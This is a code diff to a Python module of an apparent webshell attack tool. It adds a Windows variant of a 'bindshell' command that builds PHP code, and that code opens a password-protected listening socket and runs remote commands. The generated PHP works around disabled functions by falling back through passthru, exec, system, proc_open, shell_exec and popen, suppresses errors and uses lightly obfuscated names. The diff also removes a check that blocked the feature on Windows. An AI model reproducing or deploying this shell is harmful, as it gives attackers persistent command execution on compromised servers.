@@ -5,7 +5,101 @@ from time import sleep
 
 
 def get_php(port, passwd):
-    return """$pass="%s";
+    if (is_windows()):
+        return """$pass="%s";
+$port=%s;
+@error_reporting(0);
+@set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
+$sQUf=@ini_get('disable_functions');
+if(!empty($sQUf)){
+  $sQUf=preg_replace('/[, ]+/', ',', $sQUf);
+  $sQUf=explode(',', $sQUf);
+  $sQUf=array_map('trim', $sQUf);
+}else{
+  $sQUf=array();
+}
+$scl='socket_create_listen';
+if(is_callable($scl)&&!in_array($scl,$sQUf)){
+  $sock=@$scl($port);
+}else{
+  $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+  $ret=@socket_bind($sock,0,$port);
+  $ret=@socket_listen($sock,5);
+}
+while (1){
+$msgsock=@socket_accept($sock);
+$o="password:>";
+@socket_write($msgsock,$o,strlen($o));
+$pwd=@socket_read($msgsock,2048,PHP_NORMAL_READ);
+if (trim($pwd) === $pass){
+$o="password correct\\n";
+@socket_write($msgsock,$o,strlen($o));
+while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
+  {
+    $o = '';
+    $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
+    if(FALSE===$c){break;}
+    $c=trim($c);
+    if(substr($c,0,3) == 'cd '){
+      chdir(substr($c,3));
+    } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+      break;
+    }else{
+    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
+      $c=$c." 2>&1\\n";
+    }
+    $NeYd='is_callable';
+    $BDpSjt='in_array';
+    if($NeYd('passthru')and!$BDpSjt('passthru',$sQUf)){
+      ob_start();
+      passthru($c);
+      $o=ob_get_contents();
+      ob_end_clean();
+    }else
+    if($NeYd('exec')and!$BDpSjt('exec',$sQUf)){
+      $o=array();
+      exec($c,$o);
+      $o=join(chr(10),$o).chr(10);
+    }else
+    if($NeYd('system')and!$BDpSjt('system',$sQUf)){
+      ob_start();
+      system($c);
+      $o=ob_get_contents();
+      ob_end_clean();
+    }else
+    if($NeYd('proc_open')and!$BDpSjt('proc_open',$sQUf)){
+      $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
+      $o=NULL;
+      while(!feof($pipes[1])){
+        $o.=fread($pipes[1],1024);
+      }
+      @proc_close($handle);
+    }else
+    if($NeYd('shell_exec')and!$BDpSjt('shell_exec',$sQUf)){
+      $o=shell_exec($c);
+    }else
+    if($NeYd('popen')and!$BDpSjt('popen',$sQUf)){
+      $fp=popen($c,'r');
+      $o=NULL;
+      if(is_resource($fp)){
+        while(!feof($fp)){
+          $o.=fread($fp,1024);
+        }
+      }
+      @pclose($fp);
+    }else
+    { $o=0;}
+    }
+    @socket_write($msgsock,$o,strlen($o));
+  }
+}else {
+  $o="password error";
+  @socket_write($msgsock,$o,strlen($o));
+}
+@socket_close($msgsock);
+}""" % (passwd, port)
+    else:
+        return """$pass="%s";
 $port="%s";
 $socket = stream_socket_server('tcp://0.0.0.0:'.$port, $errno, $errstr, STREAM_SERVER_BIND|STREAM_SERVER_LISTEN);
 if ($socket === false) {
@@ -55,8 +149,6 @@ def run(port: int = 7777, passwd: str = "doughnuts"):
 
     eg: bindshell {port=7777} {passwd=doughnuts}
     """
-    if (is_windows()):
-        return
     t = Thread(target=send, args=(get_php(str(port), passwd), ))
     t.setDaemon(True)
     t.start()
